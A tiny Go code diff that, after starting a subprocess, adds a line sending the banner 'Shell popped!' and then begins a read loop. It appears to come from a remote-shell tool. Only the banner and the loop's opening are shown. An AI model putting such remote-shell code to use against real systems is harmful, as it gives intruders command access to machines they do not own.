@@ -33,6 +33,8 @@ func main() {
 
 	subCmd.Start()
 
+	send([]byte("Shell popped!\n"), 14)
+
 	go func() {
 		buf := make([]byte, 16)
 		for {
